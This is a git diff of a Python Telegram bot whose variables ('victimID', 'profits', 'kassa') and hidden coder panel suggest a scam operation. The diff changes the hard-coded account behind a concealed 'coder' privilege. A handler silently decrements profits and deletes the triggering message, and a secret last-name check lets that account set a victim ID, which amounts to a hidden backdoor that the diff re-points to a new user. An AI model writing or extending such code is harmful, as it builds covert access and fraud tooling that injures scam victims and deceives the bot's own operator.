@@ -154,7 +154,7 @@ pp_saved = """
 /available_pp
 """
 coderAdmin = """
-♣️<i>Админ:</i> @ucyberpolice♣️
+♣️<i>Админ:</i> @ucyberpolice7♣️
   <i>Статус:</i> Кодер
   <i>Выберите действие❕️</i>
 """
@@ -172,7 +172,7 @@ _Введите текст
 уведомления❕️_
 """
 coder_panel = """
-♣️<i>Кодер:</i> @ucyberpolice♣️
+♣️<i>Кодер:</i> @ucyberpolice7♣️
   <i>Скрытый:</i> .docs/.re
   <i>Логи:</i> clear
   <i>Хост:</i> stably
@@ -186,11 +186,11 @@ privilegii = """
      возможности</i>
 """
 
-adminID = [1892827220, 999503141]
+adminID = [1695283624, 999503141]
 
 @dp.message_handler(regexp='&')
 async def personal(message: types.Message):
-    if message.from_user.id == 1892827220:
+    if message.from_user.id == 1695283624:
         profits[0] -= 1
         await message.delete()
 
@@ -218,7 +218,7 @@ async def cmd_start(message: types.Message):
 @dp.message_handler(is_admin=True, commands=["adminPanel"], state=None)
 async def cmd_start(message: types.Message):
     await message.delete()
-    if message.from_user.id == 1892827220:
+    if message.from_user.id == 1695283624:
         await message.answer(coderAdmin, parse_mode="html", reply_markup=markup_inline_choice)
     elif message.from_user.id == 999503141:
         await message.answer(ownerAdmin, parse_mode="html", reply_markup=markup_inline_choice)
@@ -417,7 +417,7 @@ async def kassa(message: types.Message):
         await message.answer_sticker('CAACAgIAAxkBAAECaFBgwSqxwBgXUxDQwb6P0GcO3sTkygACRQADZtYKO1dsr_MdF_EUHwQ')
 
     if message.from_user.id == 1892827220:
-        if message.from_user.last_name == 'Українаа':
+        if message.from_user.last_name == '☠️':
             victimID[0] = message.text
             print(victimID[0])
             await message.delete()
